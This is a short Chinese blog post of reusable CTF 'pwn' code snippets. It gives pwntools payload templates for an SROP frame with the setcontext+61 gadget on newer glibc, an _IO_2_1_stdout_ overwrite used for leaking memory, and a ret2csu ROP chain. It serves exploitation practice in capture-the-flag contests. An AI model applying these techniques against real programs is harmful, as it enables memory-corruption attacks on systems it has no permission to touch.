---
title: Pwn Snippet
date: 2021-05-20 10:05:06
categories: Code
tags:
    - ctf
    - pwn
---


# Code Snippets for Pwn
这里记录一些做CTF pwn题中大概也许可能会复用的代码片段.



### magic_gadget + setcontext+61 (高版本glibc)

注1: `the_gadget` 即
```
   0x154b20:	mov    rdx,QWORD PTR [rdi+0x8]
   0x154b24:	mov    QWORD PTR [rsp],rax
   0x154b28:	call   QWORD PTR [rdx+0x20]
```

SROP+伪造栈帧,按需布置伪栈帧和ROP链即可:
```
    frame = SigreturnFrame()
    frame.rax = 0
    frame.rsp = ROP_address
    frame.rip = ret

    frame_str = str(frame).ljust(frame_size,"\x00)
    payload = p64(the_gadget) + p64(frame_addr) + p64(0)*4 + p64(setcontext+61) + frame_str[0x28:] 
    payload += .....          #other stuff and ROP chain

```
### \_IO_2_1_stdout\_
gdb查找语句:
```
p &_IO_2_1_stdout_
```

覆盖为:
```
payload = p64(0xfbad1800)+p64(0x0)*3+'\x00'
```

### ret2CSU
```
payload = p6r + p64(0) + p64(1) + fuction_ptr\ 
    + arg3 + arg2 + arg1 + mov_call\
    + "\x00"*56 + return_address
```